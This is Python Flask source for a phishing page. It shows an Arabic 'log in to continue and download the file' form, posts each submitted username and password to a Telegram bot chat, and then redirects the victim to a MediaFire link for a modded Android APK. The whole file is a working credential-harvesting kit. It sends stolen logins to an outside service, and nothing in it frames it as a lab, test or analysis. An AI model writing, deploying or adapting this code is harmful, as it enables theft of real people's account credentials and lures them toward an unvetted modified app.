import os
import requests
from flask import Flask, redirect, render_template_string, request

app = Flask(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")


def send_to_telegram(message):
  if not BOT_TOKEN or not CHAT_ID:
    return False
  url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
  payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
  try:
    response = requests.post(url, json=payload)
    return response.json().get("ok", False)
  except:
    return False


HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Tahoma, sans-serif; }
        body { background: #e9ecef; display: flex; justify-content: center; align-items: center; min-height: 100vh; width: 100vw; }
        .login-container { background: #fff; width: 100%; height: 100vh; padding: 50px 30px; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        @media (min-width: 768px) { 
            .login-container { height: auto; width: 100%; max-width: 520px; border-radius: 16px; box-shadow: 0 8px 30px rgba(0,0,0,0.12); padding: 50px 40px; } 
        }
        h2 { margin-bottom: 35px; color: #2c3e50; font-size: 26px; text-align: center; }
        .form-group { width: 100%; margin-bottom: 24px; }
        input { width: 100%; padding: 16px 18px; border: 1.5px solid #cbd5e1; border-radius: 10px; font-size: 17px; outline: none; transition: border-color 0.2s; background: #f8fafc; }
        input:focus { border-color: #0d6efd; background: #fff; }
        button { width: 100%; padding: 16px; background: #0d6efd; color: white; border: none; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; transition: background 0.2s; margin-top: 10px; }
        button:hover { background: #0b5ed7; }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>تسجيل الدخول للمتابعة</h2>
        <form action="/submit" method="POST">
            <div class="form-group"><input type="text" name="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required></div>
            <div class="form-group"><input type="password" name="password" placeholder="كلمة المرور" required></div>
            <button type="submit">دخول وتحميل الملف</button>
        </form>
    </div>
</body>
</html>
"""


@app.route("/")
def home():
  return render_template_string(HTML_TEMPLATE)


@app.route("/submit", methods=["POST"])
def submit():
  username = request.form.get("username")
  password = request.form.get("password")

  msg = f"🚨 <b>بيانات جديدة:</b>\n👤 <b>المستخدم:</b> {username}\n🔑 <b>الباسورد:</b> {password}"
  send_to_telegram(msg)

  return redirect(
      "https://www.mediafire.com/file/61ugass1zqpavlm/Hide_Online_v4.9.50_Mod__40_Updated__41_.apk/file"
  )


if __name__ == "__main__":
  app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
